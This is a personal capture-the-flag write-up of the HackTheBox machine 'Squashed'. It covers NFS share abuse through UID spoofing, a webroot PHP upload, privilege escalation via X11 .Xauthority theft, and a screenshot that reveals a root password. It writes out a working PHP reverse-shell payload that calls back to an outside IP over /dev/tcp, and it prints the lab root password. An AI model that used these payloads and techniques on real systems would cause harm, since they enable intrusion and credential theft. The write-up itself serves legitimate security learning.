# Squashed

After running `nmap`, I browsed the site for a bit, but after not finding anything interesting, then I researched the nfs service running on port 2049 since I did not recognize it.

# NFS on port 2049

After some digging around I explored what NFS is and how it might be exploited. Turns out it's recommended to not be exposed to everyone as the authentication is very limited.

To see available shares:

```
showmount -e box.htb
Export list for box.htb:
/home/ross    *
/var/www/html *
```

## Mounting the drives

I had some issues trying mount the drives, but a kernel reboot solves those issues. Spent a good amount of time trying to figure out what was wrong too!

```
$ mkdir r
$ sudo mount -t nfs box.htb:/home/ross ./r
$ ls -ld ./r
drwxr-xr-x 14 1001 onepassword 4096 May 16 00:49 r/
```

Looks like it's owned by user with user id 1001 and group onepassword??

I can browse the files since they're world readable, but only interesting file I could find was a KeePass file:

```
-rw-rw-r-- 1 1001 onepassword 1365 Oct 19  2022 Passwords.kdbx
```

Maybe I'll need it later, but for now I'll ignore it since I don't know how to crack it!

# /var/www/html

The other share is very interesting! Since /var/www/html is a typical place to put website files, maybe this controls the website at box.htb:80/.

```
$ mkdir www
$ sudo mount -t nfs box.htb:/var/www/html ./www
$ ls -ld www
drwxr-xr-- 5 dummy http 4096 May 17 11:30 www
```

Looks like this is owned by user id 2017, and I do not have permission to enter the directory. But as I understand it, NFS "authentication" is weak, and we might be able to pretend to be user id 2017 by simply creating a new user with this id.

```
$ sudo useradd dummy
$ sudo usermod -u 2017 dummy
$ sudo su dummy
$ id
uid=2017(dummy) gid=1002(dummy) groups=1002(dummy)
$ ls -l
total 56
drwxr-xr-x 2 dummy http   4096 May 17 11:40 css
-rw-r--r-- 1 dummy http     44 Oct 21  2022 .htaccess
drwxr-xr-x 2 dummy http   4096 May 17 11:40 images
-rw-r----- 1 dummy http  32532 May 17 11:40 index.html
drwxr-xr-x 2 dummy http   4096 May 17 11:40 js
```

So far so good. Now if this really does control the website, maybe we can mess with it and give up access. First I'll test by uploading a normal html file and see if I can access it in the browser.

```
$ echo "hello, world!" > foo.html
$ curl http://box.htb/foo.html
hello, world
```

It works! Now, Wappalyzer tells me PHP is running, but let's confirm it as well.

```
$ echo '<?php echo "hello, php" ?>' > foo.php
$ curl http://box.htb/foo.php
hello, php
```

Nice! So next step is to get a reverse shell. Spent some time trying different things off google, and landed on this:

```
$ echo -e "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.17/4444 0>&1'\");" > shell.php
```

And started a netcat listener in another terminal

```
nc -lnvp 4444
```

And finally `curl`ed from the first terminal

```
$ curl http://box.htb/shell.php
```

Which gets me this on the nc listener:

```
$ nc -lnvp 4444 # <-- from earlier
Connection from 10.10.11.191:45952
bash: cannot set terminal process group (1083): Inappropriate ioctl for device
bash: no job control in this shell
alex@squashed:/var/www/html$ 
```

And now to upgrade the reverse shell so it's like a normal shell. I always do these steps:

```
$ script -qc /bin/bash /dev/null
C-z (backgrounds the reverse shell and brings me to attacking shell
$ stty raw -echo; fg # (fg brings me back to reverse shell)
$ reset
screen<enter>
```

Done! I usually don't bother with terminal size etc. Hasn't been an issue yet.

And since I've missed hidden files in the past, I always create this alias:

```
$ alias ll='ls -la'
```

Okay, good to go! Does Alex have the user flag?

```
alex@squashed:/var/www/html$ cat /etc/passwd | grep alex
alex:x:2017:2017::/home/alex:/bin/bash
alex@squashed:/var/www/html$ ll /home/alex/ | grep user.txt
-rw-r-----  1 root alex   33 May 15 22:50 user.txt
alex@squashed:/var/www/html$ cat /home/alex/user.txt 
<redacted>
```

Easy peasy!

Now to escalate to root somehow!


# Linux Exploit Suggester

exploit/linux/local/network_manager_vpnc_username_priv_esc
exploit/linux/local/su_login

# Came back to this box after a week!

Moved the xauthority file to alex:

```
(from attacking machiine while in ross mounted dir)
cat .Xauthority | base64

<take output into reverse shell alex home dir and create the .Xautority file>
alex$ echo "<output from above>" | base64 -d > .Xauthority
alex$ export HOME=/home/alex
alex$ w
 17:10:12 up 36 min,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ross     tty7     :0               16:34   36:14   3.90s  0.04s /usr/libexec/gn
```

Finally some progress!

Shows display is called ":0"

Hacktricks suggest capturing a screenshot:

```
xwd -root -screen -silent -display :0 > screenshot.xwd
```

Transferred that to attacking machine to convert:


```
convert screenshot.xwd screenshot.png
```

And the screenshot shows root password in KeePass open - how convenient :D

```
cah$mei7rai9A
```

Ssh doesn't work for some reason - maybe password based auth is disabled?

Luckily, it's possible to change user from alex in our reverse shell:

```
alex$ su - root
<root pwd>
root$ id
uid=0(root) gid=0(root) groups=0(root)
root$ cat /root/root.txt
<snip>
```

Done!

# Conclusion

This box was fairly difficult for me. I did not know about .Xauthority and them being sensitive! I also did not know about the vulnerabilities about NFS.
